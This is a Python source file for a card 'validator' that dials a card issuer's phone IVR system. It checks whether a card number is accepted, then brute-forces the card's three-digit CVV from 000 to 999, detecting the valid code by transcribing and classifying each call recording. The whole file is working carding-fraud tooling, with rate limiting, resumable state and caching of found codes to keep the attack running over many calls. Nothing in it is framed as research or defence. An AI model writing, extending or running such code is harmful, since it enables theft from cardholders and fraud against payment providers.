#!/usr/bin/env python3
"""
CardValidator - per-card orchestration of Phase 1 (card check) +
Phase 2 (CVV 000-999 brute force with rate limits + resume).

State scoping:
  - Resume code (cvv next-to-try) is scoped per (IVR profile + card last4) combo.
  - CVV success is also scoped per (IVR profile + card last4) so once a card
    on one IVR has a validated CVV, it won't re-run the loop unless the
    state file is deleted.
  - Rate limits (daily/hourly) are process-global to protect total spend.
"""

from __future__ import annotations

import asyncio
import json
import logging
import time
from collections import deque
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Deque, Dict, List, Optional, Tuple

from config import (
    Config,
    IVRProfile,
    ProviderPolicy,
    CardSpec,
)
from ivr_client import IVRClient
from response_analyzer import ResponseAnalyzer, ResponseCategory
from transcription import TranscriptionService


# ---------- Shared Enums ----------


class ValidationState(Enum):
    CARD_SUBMITTED = "card_submitted"
    AWAITING_RESPONSE = "awaiting_response"
    SECURITY_CODE_REQUIRED = "security_code_required"
    CARD_INVALID = "card_invalid"
    VERIFICATION_REQUIRED = "verification_required"
    VALIDATION_COMPLETE = "validation_complete"


@dataclass
class ValidationResult:
    card_number_masked: str
    state: ValidationState
    response_category: Optional[ResponseCategory] = None
    security_code: Optional[str] = None
    security_code_valid: Optional[bool] = None
    transcript: Optional[str] = None
    matched_phrase: Optional[str] = None
    duration_seconds: float = 0.0
    timestamp: str = ""
    error: Optional[str] = None
    provider_used: Optional[str] = None
    attempts: Optional[List[Dict[str, Any]]] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "card_number_masked": self.card_number_masked,
            "state": self.state.value,
            "response_category": (
                self.response_category.value if self.response_category else None
            ),
            "security_code": self.security_code,
            "security_code_valid": self.security_code_valid,
            "transcript": (self.transcript or "")[:1000],
            "matched_phrase": self.matched_phrase,
            "duration_seconds": self.duration_seconds,
            "timestamp": self.timestamp,
            "error": self.error,
            "provider_used": self.provider_used,
            "attempts": self.attempts or [],
        }


# ---------- RateLimiter (global, persisted in state file) ----------


class RateLimiter:
    def __init__(self, max_daily: int, max_hourly: int, logger: logging.Logger):
        self.max_daily = max_daily
        self.max_hourly = max_hourly
        self.logger = logger
        self.hourly: Deque[float] = deque()
        self.daily: Deque[float] = deque()

    def load_from_dict(self, data: Dict[str, Any]) -> None:
        now = time.time()
        for ts in data.get("hourly", []) or []:
            try:
                if now - float(ts) < 3600:
                    self.hourly.append(float(ts))
            except (TypeError, ValueError):
                continue
        for ts in data.get("daily", []) or []:
            try:
                if now - float(ts) < 86400:
                    self.daily.append(float(ts))
            except (TypeError, ValueError):
                continue
        self.logger.info(
            f"RateLimiter loaded: today_calls={len(self.daily)} hour_calls={len(self.hourly)}"
        )

    def to_dict(self) -> Dict[str, Any]:
        return {"hourly": list(self.hourly), "daily": list(self.daily)}

    def record_call(self) -> None:
        now = time.time()
        self.hourly.append(now)
        self.daily.append(now)
        self._prune(now)

    def _prune(self, now: float) -> None:
        while self.hourly and now - self.hourly[0] >= 3600:
            self.hourly.popleft()
        while self.daily and now - self.daily[0] >= 86400:
            self.daily.popleft()

    def can_call(self) -> Tuple[bool, str]:
        now = time.time()
        self._prune(now)
        if self.max_daily > 0 and len(self.daily) >= self.max_daily:
            return False, f"DAILY_LIMIT_REACHED ({len(self.daily)}/{self.max_daily})"
        if self.max_hourly > 0 and len(self.hourly) >= self.max_hourly:
            return False, f"HOURLY_LIMIT_REACHED ({len(self.hourly)}/{self.max_hourly})"
        return True, "OK"

    def next_hourly_slot(self) -> float:
        if self.max_hourly <= 0 or len(self.hourly) < self.max_hourly:
            return 0.0
        now = time.time()
        oldest = self.hourly[0]
        return max(0.0, 3600.0 - (now - oldest))

    def next_daily_slot(self) -> float:
        if self.max_daily <= 0 or len(self.daily) < self.max_daily:
            return 0.0
        now = time.time()
        oldest = self.daily[0]
        return max(0.0, 86400.0 - (now - oldest))


# ---------- StateStore (scoped per (ivr + card) combo) ----------


class StateStore:
    """Persists rate limiter state + per-card CVV resume + successes."""

    def __init__(self, path: Path, logger: logging.Logger):
        self.path = Path(path)
        self.logger = logger
        self._data: Dict[str, Any] = {}
        self._load()

    def _load(self) -> None:
        if not self.path.exists():
            self._data = {"rate": {}, "cards": {}}
            return
        try:
            self._data = json.loads(self.path.read_text())
            self._data.setdefault("rate", {})
            self._data.setdefault("cards", {})
        except Exception as e:
            self.logger.warning(f"State file corrupt - starting empty: {e}")
            self._data = {"rate": {}, "cards": {}}

    def save(self) -> None:
        try:
            self.path.parent.mkdir(parents=True, exist_ok=True)
            self.path.write_text(json.dumps(self._data, indent=2))
        except Exception as e:
            self.logger.warning(f"Failed to save state file {self.path}: {e}")

    # ---- Rate limiter integration ----
    def load_rate(self, rl: RateLimiter) -> None:
        rl.load_from_dict(self._data.get("rate", {}))

    def save_rate(self, rl: RateLimiter) -> None:
        self._data["rate"] = rl.to_dict()
        self.save()

    # ---- Per-card scope ----
    @staticmethod
    def scope_key(profile: IVRProfile, card: CardSpec) -> str:
        return f"ivr={profile.profile_id}:card_last4={card.number[-4:] if card.number else 'none'}"

    def get_card_state(self, profile: IVRProfile, card: CardSpec) -> Dict[str, Any]:
        key = self.scope_key(profile, card)
        entry = self._data["cards"].get(key)
        default_start = max(0, int(card.cvv_start or 0))
        if not entry:
            return {"resume_code": default_start, "valid_code": None}
        try:
            resume = int(entry.get("resume_code", default_start))
        except (TypeError, ValueError):
            resume = default_start
        valid = entry.get("valid_code")
        if valid and isinstance(valid, (int, float)):
            valid = f"{int(valid):03d}"
        return {
            "resume_code": max(0, min(999, resume)),
            "valid_code": valid,
        }

    def set_card_state(
        self,
        profile: IVRProfile,
        card: CardSpec,
        resume_code: int,
        valid_code: Optional[Any],
    ) -> None:
        key = self.scope_key(profile, card)
        try:
            rc = int(resume_code)
        except (TypeError, ValueError):
            rc = 0
        if valid_code is None:
            stored_valid = None
        elif isinstance(valid_code, (int, float)):
            stored_valid = f"{int(valid_code):03d}"
        else:
            stored_valid = str(valid_code)
        self._data["cards"][key] = {
            "card_masked": card.masked(),
            "ivr_profile_id": profile.profile_id,
            "resume_code": max(0, min(1000, rc)),
            "valid_code": stored_valid,
            "updated_at": datetime.utcnow().isoformat(),
        }
        self.save()


# ---------- CardValidator ----------


class CardValidator:
    """Validates one CardSpec against one IVRProfile using ProviderPolicy."""

    def __init__(
        self,
        config: Config,
        profile: IVRProfile,
        provider_policy: ProviderPolicy,
        state_store: StateStore,
        rate_limiter: RateLimiter,
        analyzer: ResponseAnalyzer,
        logger: logging.Logger,
    ):
        self.config = config
        self.profile = profile
        self.provider_policy = provider_policy
        self.state = state_store
        self.rate = rate_limiter
        self.analyzer = analyzer
        self.logger = logger
        # Shared IVRClient across all attempts (reconnects itself if dead).
        self._ivr: Optional[IVRClient] = None
        # Shared TranscriptionService across all attempts (sync HTTP).
        self._ts: Optional[TranscriptionService] = None

    # ---- Dependency management ----
    def _get_ivr(self) -> IVRClient:
        if self._ivr is None:
            self._ivr = IVRClient(
                self.config, self.profile, self.provider_policy, self.logger
            )
        return self._ivr

    def _get_ts(self) -> TranscriptionService:
        if self._ts is None:
            self._ts = TranscriptionService(self.config, self.logger)
        return self._ts

    async def close(self) -> None:
        if self._ivr is not None:
            try:
                await self._ivr.disconnect()
            except Exception as e:
                self.logger.debug(f"CardValidator IVRClient close err: {e}")

    # ---- Rate limiting ----
    async def _sleep_until_rate_slot(self) -> bool:
        """Sleep until a rate-limit slot opens. Returns False if impossible.

        Uses asyncio.sleep so the event loop is free (not time.sleep).
        """
        first_warning = True
        while True:
            ok, reason = self.rate.can_call()
            if ok:
                return True
            self.logger.warning(f"Rate limit: {reason}")
            if reason.startswith("DAILY_LIMIT_REACHED"):
                wait_s = self.rate.next_daily_slot() + 2.0
                if wait_s > 6 * 3600:
                    # More than 6h to next daily slot => stop; user can retry tomorrow.
                    self.logger.error(
                        f"Daily call limit reached, {wait_s:.0f}s until next slot "
                        f"- refusing to wait overnight. Exiting loop."
                    )
                    return False
                if first_warning:
                    self.logger.info(
                        f"Waiting {wait_s:.0f}s for next daily slot (~{wait_s/3600:.1f}h)."
                    )
                    first_warning = False
                await asyncio.sleep(min(wait_s, 60.0))
                continue
            # Hourly limit
            wait = self.rate.next_hourly_slot() + 1.0
            self.logger.info(f"Sleeping ~{wait:.0f}s until next hourly slot...")
            await asyncio.sleep(wait)

    @staticmethod
    def _utc_iso() -> str:
        return datetime.utcnow().isoformat()

    # ---- Public entry ----
    async def validate_card(self, card: CardSpec) -> Dict[str, Any]:
        masked = card.masked()
        self.logger.info(
            f"Starting validation for card {masked} against IVR "
            f"{self.profile.profile_id}={self.profile.ivr_phone_number}"
        )

        # Load per-card persisted state (resume CVV, already-validated code)
        entry = self.state.get_card_state(self.profile, card)
        initial_resume = int(entry.get("resume_code") or 0)
        resume_code = initial_resume
        already_valid_code = entry.get("valid_code")

        # Phase 1: card number check
        self.logger.info("Phase 1: Check card number validity via IVR")
        try:
            card_result = await self._phase1_card_check(card)
        except Exception as e:
            self.logger.exception(f"Phase 1 top-level error: {e}")
            card_result = ValidationResult(
                card_number_masked=masked,
                state=ValidationState.VALIDATION_COMPLETE,
                error=str(e),
                timestamp=self._utc_iso(),
            )

        if card_result.state != ValidationState.SECURITY_CODE_REQUIRED:
            self.logger.error(
                f"Phase 1 failed: state={card_result.state.value} "
                f"cat={card_result.response_category.value if card_result.response_category else None}"
            )
            return {
                "success": False,
                "card": masked,
                "ivr_profile_id": self.profile.profile_id,
                "card_result": card_result.to_dict(),
                "security_result": None,
                "valid_code": already_valid_code,
                "resume_code": resume_code,
            }

        self.logger.info("Phase 1 OK: IVR requested 3-digit security code")

        # Phase 2 (or skip if we already know the code for this scope)
        if already_valid_code:
            self.logger.info(
                f"Already have valid CVV for this scope: {already_valid_code} "
                f"(to retest, delete state.json entry or set valid_code=null)"
            )
            valid_str = str(already_valid_code)
            sec = ValidationResult(
                card_number_masked=masked,
                state=ValidationState.VALIDATION_COMPLETE,
                security_code=valid_str,
                security_code_valid=True,
                timestamp=self._utc_iso(),
                error="cached from prior run",
            )
            return {
                "success": True,
                "card": masked,
                "ivr_profile_id": self.profile.profile_id,
                "card_result": card_result.to_dict(),
                "security_result": sec.to_dict(),
                "valid_code": valid_str,
                "resume_code": resume_code,
            }

        self.logger.info(
            f"Phase 2: CVV brute force starting at {resume_code:03d} "
            f"(daily_cap={self.config.max_daily_calls}, "
            f"hourly_cap={self.config.rate_limit_calls_per_hour})"
        )

        security_result = None
        try:
            security_result = await self._phase2_cvv_brute_force(
                card, start_at=resume_code
            )
            # Update stored resume_code to reflect actual stopping point
            final_entry = self.state.get_card_state(self.profile, card)
            resume_code = int(final_entry.get("resume_code") or resume_code)
            if security_result is not None and security_result.security_code_valid:
                already_valid_code = str(security_result.security_code)
        finally:
            await self.close()

        return {
            "success": True,
            "card": masked,
            "ivr_profile_id": self.profile.profile_id,
            "card_result": card_result.to_dict(),
            "security_result": security_result.to_dict() if security_result else None,
            "valid_code": (already_valid_code if already_valid_code else None),
            "resume_code": resume_code,
        }

    # ---- Phase 1 ----
    async def _phase1_card_check(self, card: CardSpec) -> ValidationResult:
        masked = card.masked()
        if not await self._sleep_until_rate_slot():
            return ValidationResult(
                card_number_masked=masked,
                state=ValidationState.VALIDATION_COMPLETE,
                error="Rate limit hit before Phase 1",
                timestamp=self._utc_iso(),
            )

        ivr = self._get_ivr()
        call: Optional[Dict[str, Any]] = None
        try:
            # Ensure manager is live; reconnect if previous was stale.
            if ivr.manager is None:
                await ivr.connect()
            call = await ivr.validate_card(card.number)
        except Exception as e:
            self.logger.exception(f"Phase 1 IVR error: {e}")
            return ValidationResult(
                card_number_masked=masked,
                state=ValidationState.VALIDATION_COMPLETE,
                error=f"IVR call failed: {e}",
                timestamp=self._utc_iso(),
            )

        # Record regardless of transcription success.
        self.rate.record_call()
        self.state.save_rate(self.rate)

        if not call:
            return ValidationResult(
                card_number_masked=masked,
                state=ValidationState.VALIDATION_COMPLETE,
                error="IVR call returned None",
                timestamp=self._utc_iso(),
            )

        try:
            ts = self._get_ts()
            transcript = await asyncio.to_thread(ts.transcribe, call["recording_path"])
        except Exception as e:
            self.logger.exception(f"Phase 1 transcription failed: {e}")
            transcript = {"transcript": "", "words": [], "duration_seconds": 0.0}

        full_text = str(transcript.get("transcript", ""))
        cat = self.analyzer.classify_card_response(full_text)

        if cat == ResponseCategory.SECURITY_CODE_PROMPT:
            state = ValidationState.SECURITY_CODE_REQUIRED
        elif cat == ResponseCategory.INVALID_CARD:
            state = ValidationState.CARD_INVALID
        elif cat == ResponseCategory.VERIFICATION_REQUIRED:
            state = ValidationState.VERIFICATION_REQUIRED
        else:
            state = ValidationState.VALIDATION_COMPLETE

        return ValidationResult(
            card_number_masked=masked,
            state=state,
            response_category=cat,
            transcript=full_text,
            duration_seconds=float(call.get("duration") or 0.0),
            timestamp=self._utc_iso(),
            provider_used=call.get("provider"),
        )

    # ---- Phase 2 (CVV 000-999) ----
    async def _phase2_cvv_brute_force(
        self, card: CardSpec, start_at: int
    ) -> Optional[ValidationResult]:
        masked = card.masked()
        current_code = max(0, int(start_at))
        attempt_log: List[Dict[str, Any]] = []
        ivr = self._get_ivr()
        ts = self._get_ts()
        cooldown = max(0.5, float(self.config.call_cooldown_seconds))

        # Ensure AMI connection live before we enter the 1000-attempt loop.
        if ivr.manager is None:
            await ivr.connect()

        while current_code <= 999:
            if current_code % 25 == 0:
                self.logger.info(
                    f"CVV progress: testing code {current_code:03d} -> "
                    f"{min(999, current_code + 24):03d} (attempt #{len(attempt_log) + 1})"
                )

            code_str = f"{current_code:03d}"

            # Rate-limit gating
            if not await self._sleep_until_rate_slot():
                self.logger.warning(
                    f"Stopping CVV loop at {code_str} due to rate limits; "
                    f"resume point saved."
                )
                self.state.set_card_state(
                    self.profile, card, resume_code=current_code, valid_code=None
                )
                return None

            # Bump counter & persist BEFORE attempt so resume never re-does a code
            next_code = current_code + 1
            self.state.set_card_state(
                self.profile, card, resume_code=next_code, valid_code=None
            )

            attempt_record: Dict[str, Any] = {"code": code_str, "ts": self._utc_iso()}

            try:
                if ivr.manager is None:
                    await ivr.connect()
                call = await ivr.validate_security_code(card.number, code_str)
            except Exception as e:
                self.logger.exception(f"CVV {code_str} IVR call error: {e}")
                attempt_record["error"] = f"ivr_call: {e}"
                attempt_log.append(attempt_record)
                # Try to reconnect on next iteration.
                try:
                    await ivr.disconnect()
                except Exception:
                    pass
                await asyncio.sleep(max(1.0, cooldown))
                current_code = next_code
                continue

            # Rate record + persist
            self.rate.record_call()
            self.state.save_rate(self.rate)

            attempt_record["provider"] = call.get("provider")
            attempt_record["dialstatus"] = call.get("dialstatus")
            attempt_record["hangup_cause"] = call.get("hangup_cause")
            attempt_record["duration"] = call.get("duration")

            try:
                transcript = await asyncio.to_thread(ts.transcribe, call["recording_path"])
            except FileNotFoundError as e:
                self.logger.error(f"Recording missing for CVV {code_str}: {e}")
                attempt_record["error"] = f"recording_missing: {e}"
                attempt_log.append(attempt_record)
                await asyncio.sleep(max(1.0, cooldown * 0.5))
                current_code = next_code
                continue
            except Exception as e:
                self.logger.exception(f"Transcription failed for CVV {code_str}: {e}")
                attempt_record["error"] = f"transcribe: {e}"
                attempt_log.append(attempt_record)
                await asyncio.sleep(max(1.0, cooldown))
                current_code = next_code
                continue

            full_text = str(transcript.get("transcript", ""))
            attempt_record["transcript_preview"] = full_text[:300]
            attempt_record["transcript_length"] = len(full_text)

            try:
                ok = self.analyzer.classify_security_code_response(full_text)
            except Exception as e:
                self.logger.exception(f"Classifier error for CVV {code_str}: {e}")
                ok = False
                attempt_record["classifier_error"] = str(e)

            attempt_record["classified_valid"] = bool(ok)
            attempt_log.append(attempt_record)

            if ok:
                self.logger.info(
                    f"✓ VALID CVV FOUND: {code_str} -> transcript snippet: {full_text[:200]!r}"
                )
                self.state.set_card_state(
                    self.profile,
                    card,
                    resume_code=next_code,
                    valid_code=int(code_str),
                )
                return ValidationResult(
                    card_number_masked=masked,
                    state=ValidationState.VALIDATION_COMPLETE,
                    security_code=code_str,
                    security_code_valid=True,
                    transcript=full_text,
                    duration_seconds=float(call.get("duration") or 0.0),
                    timestamp=self._utc_iso(),
                    provider_used=call.get("provider"),
                    attempts=attempt_log,
                )

            # Progress line for every individual attempt (debug level)
            self.logger.debug(
                f"CVV {code_str}: invalid classifier result False; continuing "
                f"(transcript_len={len(full_text)})"
            )
            await asyncio.sleep(cooldown)
            current_code = next_code

        self.logger.info(
            f"No valid CVV found for card {masked} in 000..999 range "
            f"(tested {len(attempt_log)} attempts)."
        )
        return None
